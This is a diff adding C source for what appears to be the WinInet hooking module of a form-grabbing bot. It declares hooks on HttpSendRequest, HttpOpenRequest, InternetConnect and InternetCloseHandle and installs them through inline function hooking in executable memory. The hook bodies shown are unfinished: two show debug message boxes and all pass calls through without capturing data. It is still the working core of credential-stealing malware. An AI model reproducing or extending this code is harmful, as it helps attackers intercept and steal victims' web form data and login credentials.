@@ -1,0 +1,104 @@
+#include "wininet.h"
+#ifdef MODULE_FORMGRABBER
+#include "formgrabber.h"
+#include "hook.h"
+#include <WinInet.h>
+
+ptHttpSendRequestA oHttpSendRequestA;
+ptHttpSendRequestW oHttpSendRequestW;
+
+ptHttpOpenRequestA oHttpOpenRequestA;
+ptHttpOpenRequestW oHttpOpenRequestW;
+
+ptInternetConnectA oInternetConnectA;
+ptInternetConnectW oInternetConnectW;
+
+ptInternetReadFile oInternetReadFile;
+ptInternetCloseHandle oInternetCloseHandle;
+
+extern bot_t bot;
+
+BOOL WINAPI HttpSendRequestW_Hooked(HINTERNET hRequest,LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional,DWORD dwOptionalLength)
+{
+	MessageBox(0, "HttpSendRequestW", 0, 0);
+	return oHttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
+}
+
+BOOL WINAPI HttpSendRequestA_Hooked( HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
+{
+	MessageBox(0, "HttpSendRequestA", 0, 0);
+	return oHttpSendRequestA(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
+}
+
+HINTERNET WINAPI HttpOpenRequestA_Hooked(HINTERNET hConnect,LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer,LPCSTR FAR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
+{
+	return oHttpOpenRequestA(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
+}
+
+HINTERNET WINAPI HttpOpenRequestW_Hooked(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
+{
+	return oHttpOpenRequestW(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
+}
+
+HINTERNET WINAPI InternetConnectW_Hooked(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
+{
+	return oInternetConnectW(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
+}
+
+HINTERNET WINAPI InternetConnectA_Hooked(HINTERNET hInternet,LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
+{
+	return oInternetConnectA(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
+}
+
+BOOL WINAPI InternetCloseHandle_Hooked(HINTERNET hInternet)
+{
+	return oInternetCloseHandle(hInternet);
+}
+
+BOOL WINAPI IsWininet(HMODULE* phMod)
+{
+	HMODULE hMod;
+
+	if ((hMod = bot.api.pGetModuleHandleW(L"wininet.dll")) != 0)
+	{
+		*phMod = hMod;
+
+		return TRUE;
+	}
+
+	return FALSE;
+}
+
+BOOL WINAPI InstallWininetHooks(void)
+{
+	HMODULE hMod;
+	unsigned int i;
+	LPVOID lpFunctionAddress;
+	DWORD dwLength;
+
+	hook_t hooks[] =
+	{
+		{bot.api.pInternetConnectA, &InternetConnectA_Hooked, (LPVOID*)&oInternetConnectA, 0},
+		{bot.api.pInternetConnectW, &InternetConnectW_Hooked, (LPVOID*)&oInternetConnectW, 0},
+		{bot.api.pHttpOpenRequestA, &HttpOpenRequestA_Hooked, (LPVOID*)&oHttpOpenRequestA, 0},
+		{bot.api.pHttpOpenRequestW, &HttpOpenRequestW_Hooked, (LPVOID*)&oHttpOpenRequestW, 0},
+		{bot.api.pHttpSendRequestA, &HttpSendRequestA_Hooked, (LPVOID*)&oHttpSendRequestA, 0},
+		{bot.api.pHttpSendRequestW, &HttpSendRequestW_Hooked, (LPVOID*)&oHttpSendRequestW, 0},
+		{bot.api.pInternetCloseHandle, &InternetCloseHandle_Hooked, (LPVOID*)&oInternetCloseHandle, 0}
+	};
+
+	if (!IsWininet(&hMod))
+		return FALSE;
+
+	for (i = 0; i < sizeof(hooks) / sizeof(hook_t); i++)
+	{
+		if((*hooks[i].lpOriginalFunction = bot.api.pVirtualAlloc(0, 25, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL)
+			continue;
+
+		if (!HookFunction(hooks[i].lpFunctionAddress, hooks[i].lpCallbackAddress, *hooks[i].lpOriginalFunction, &hooks[i].dwLength))
+			return FALSE;
+	}
+
+	return TRUE;
+}
+#endif
